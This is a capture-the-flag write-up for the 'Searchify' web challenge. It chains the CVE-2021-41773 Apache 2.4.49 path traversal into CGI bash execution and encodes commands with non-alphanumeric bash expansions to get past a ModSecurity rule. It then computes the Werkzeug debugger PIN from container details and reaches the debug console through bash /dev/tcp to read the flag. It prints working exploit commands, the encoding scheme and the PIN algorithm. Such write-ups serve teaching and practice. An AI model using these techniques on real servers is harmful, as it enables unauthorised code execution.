# Searchify | Web (500 pts)

**Intro**

Given a web service which is stated to be a clone of a search engine. By default, it has a very basic feature, which is `query searching`.

![](imgs/webpage.png)

There's also a given source code which is including a static HTML hosted on an `Apache` webserver & a `Flask`-based API for query processing. Looking upon the frontend `Dockerfile`, we found that the webserver was indeed a vulnerable one, which is `Apache 2.4.49`. The vulnerability had already been documented as `CVE-2021-41773`. Thus, make the issue become easier for us to solve.

```Dockerfile
FROM httpd:2.4.49

RUN apt update && apt install libapache2-mod-security2 -y
RUN rm -rf /usr/share/modsecurity-crs/rules/*

ADD src /var/www
ADD conf/modsecurity.conf /etc/modsecurity/modsecurity.conf
ADD conf/waf.conf /usr/share/modsecurity-crs/rules/waf.conf
ADD conf/modsecurity_crs_21_protocol_anomalies.conf /usr/share/modsecurity-crs/rules/modsecurity_crs_21_protocol_anomalies.conf
ADD conf/httpd.conf /usr/local/apache2/conf/httpd.conf
```

Unfortunately, inspite of having a vulnerable app-version, it does come with some user patches which is made the common exploit doesn't work properly. Therefore, let us analyze how the patches works.

**Code Review**

Starting from `httpd.conf`. There we found some information regarding the hosted webservice, such as:

```md
# Only on 2.4.49, it gives the capability to exec a command
# when mod_cgid is enabled

<IfModule alias_module>
    ScriptAlias /.cgi-bin "/usr/local/apache2/cgi-bin/"
</IfModule>

<Directory "/usr/local/apache2/cgi-bin">
    AllowOverride None
    Options None
    Require all granted
</Directory>


# Reverse proxy for http://backend:5000/search
#               on  http://0.0.0.0:80/querySearch 

<VirtualHost *:*>
    ProxyPreserveHost On
    
    ProxyPass /querySearch http://backend:5000/search
    ProxyPassReverse /querySearch http://backend:5000/search    
</VirtualHost>
```

Based on those config, we can see that `/cgi-bin` endpoint had been altered into `/.cgi-bin`. Also we found there's only one exposed route from `backend` container, which is `/search`

Next, we stumbled on the real patches, which can be found on `waf.conf`.

```apache
SecRule REQUEST_BODY "[A-Za-z0-9\;\+ ]+" "id:'13337',phase:2,t:none,t:lowercase, ctl:requestBodyAccess=Off, deny"
```

As we can see, the WAF rule can be triggered by passing any data that satisfies the pattern of `[A-Za-z0-9\;\+ ]`. That's mean, only non-alphanumeric payload that won't trigger any errors.

Furthermore, any request header will be handled by `protocol_anomalies.conf` to prevent us from having a tampered or malformed header.

**Bash Jail-breaking**

As we already know, those configurations give us a chance to conduct a RCE (Remote Code Execution) on `frontend` container. But there's one major caveats, which is bypassing the `alphanumeric` WAF rule. Theoretically, it would be possible if we can somehow substitute the equivalent command in `non-alphanumeric` representation.

Fortunately, there's one sleeve card that can be used, which is by using `bash` features, such as: `brace expansion`, `literal redirection`, and so on. For instance, by manipulating the `$REQUEST_URI` using `CVE-2021-41773` we can locate `/bin/bash` to accomplish the jail-break. But how does exactly it work?

```bash
# Brace expansion
ls -la == {ls,-la}

# Indirect variable expansion
${!#} == $SHELL == bash

# Variable string length
$# == 0
${##} == 1

# Literal redirection
bash <<< 'command'

# Arithmetic expansion:
a=1; b=2
$((a+b)) == 3

# $-quoted string literals   
$ echo $'\x41' # print A (hex)
$ echo $'\101' # Also print A (octal)
```

Based on those analogies above, we might be able to craft a `non-alphanumeric` payload in the form of something like:

```bash
${!#}<<<${encoded_command}
```

**Payload crafting**

In order to have a simplest payload yet still functional, we may only substitute the blacklisted character, leaving the symbol character untouched, due to the behavior of `literal redirection`. As for the `space` limitation, we might consider of using `brace expansion`. Otherwise, the substitution process can be generalized as follows:

```md
Bash command: id

# Convert into octal-string representation
i --> 151; d --> 144

# Apply var-string length w/t arithmetic expansion
1 --> ${##}
4 --> $((${##}<<$((${##}<<${##}))))
5 --> $(($((${##}<<$((${##}<<${##}))))^${##}))

# Wrap into dollar-quoted string literal
i --> $\'\\${##}$(($((${##}<<$((${##}<<${##}))))^${##}))${##}\'
d --> $\'\\${##}$((${##}<<$((${##}<<${##}))))$((${##}<<$((${##}<<${##}))))\'

# Wrap it together, then execute using literal redirection
${!#}<<<$\'\\${##}$(($((${##}<<$((${##}<<${##}))))^${##}))${##}\'$\'\\${##}$((${##}<<$((${##}<<${##}))))$((${##}<<$((${##}<<${##}))))\'
```

Using those concepts, we made a [script](solver/encoder.py) to generate the encoded payload automatically

**Remote Code Execution (Frontend) using CVE-2021-41773**

Based on `CVE-2021-41773` POC, the RCE exploit can be triggered by using:

```bash
$ curl 'http://localhost:9013/.cgi-bin/.%2E/.%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/bin/bash' -d 'echo;command'
```

Unfortunately, `;` is nowhere to be used. This issue can be resolved by substituting the character with another logical operator, such as `&&` which is used to execute the next command if-only-if the previous command was successfully executed. In addition, we store the payload into a file, so that it eliminates the need of character escaping

```bash
$ curl 'http://localhost:9013/.cgi-bin/.%2E/.%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/bin/bash' -d @payload

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, we executed our first remote code executed. Unfortunately, the flag is stored in backend container.

**Remote Code Execution (Backend) using Werkzeug debugger**

By analyzing the `docker-compose.yml`, we can see that there's one major error, which is the Flask-backend is set to `development` mode.

```yml
  backend:
    build: backend
    restart: on-failure
    container_name: searchify_backend
    read_only: true
    environment:
      - FLASK_ENV=development
```

When it was activated, it enables an endpoint of `/console` that can be used to access the interactive python web-console. Nevertheless, it couldn't be accessed unless you have the correct `pincode`. 

Fortunately, the `pincode` itself is somehow computeable if-only-if you have the correct piece of informations. Furthermore, we can see how the `pincode` generation works on `/usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py`

```py
def get_pin_and_cookie_name(app)
    ..
    ..
    ..
    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username,
        modname,
        getattr(app, "__name__", type(app).__name__),
        getattr(mod, "__file__", None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [str(uuid.getnode()), get_machine_id()]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]
    
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name
```

Based on the code above, we can see that the `pincode` can be calculated. The problem is that the information are kind of unique, so that it cannot be collected unless you have the right to access the system directly.

That might be an issue, but we might have the solution as well. The fact is a docker container basically shares a lot of properties to the actual host. Thus, if we managed to somehow compromised one of `container`, we might be able to collect the needed information

For instance, let's split the information we need:

```md
» probably_public_bits
username     # nobody (Dockerfile)
modname      # flask.app (always the same)
appname      # Flask (always the same)
pathname     # /usr/local/lib/python3.10/site-packages/flask/app.py

» private_bits
uuid         # int(mac_address, 16)
machine_id   # /proc/sys/kernel/random/boot_id
```

Using the `RCE` capability on `frontend` container, we might be able to collect most of the informations, except for the `mac_address`. Fortunately, docker container has the unique way to generate their own physical address. 

Basically, it's a 8-byte address, where the second first always has the same value of `02:42`, follows with 6-byte of `hex(IPv4_address)`. For example:

```md
IPv4: 172.16.0.2
MAC_addr: 02:42:ac:10:00:02
```

Using those ingredients, we can now bake our own `pincode` using this [script](solver/pincode.py).

**Getting the Flag**

The last step is pretty straight-forward, but there's one caveat left, which is the `/console` endpoint weren't exposed to the public. There're many ways to resolve this problem, one of them is directly make an HTTP request to the `backend` container from inside `frontend` container.

Considering there's no builtin `curl` or `wget` command on debian-based images, we have no choice, but to use another `bash builtin /dev/tcp` feature like this:

```bash
exec 3<>/dev/tcp/backend/5000
echo -e "GET /console HTTP/1.1\r\nhost: http://backend:5000\r\nConnection: close\r\n\r\n" >&3
cat <&3
```

Furthermore, all of those process are coded in this [script](solver/sv.py)

```bash
» python sv.py 

HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.6
Date: Thu, 11 Aug 2022 14:23:00 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 193
Connection: close

>>> __import__(&#34;os&#34;).popen(&#34;cat&lt;/flag_0ac73b4846fea622e906199d592eaa85&#34;).read()
<span class="string">&#39;COMPFEST14{wh00ps_it5_n0t_s3cure_after_4ll_9b59fcb913}\n&#39;</span>
```

### **References**
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
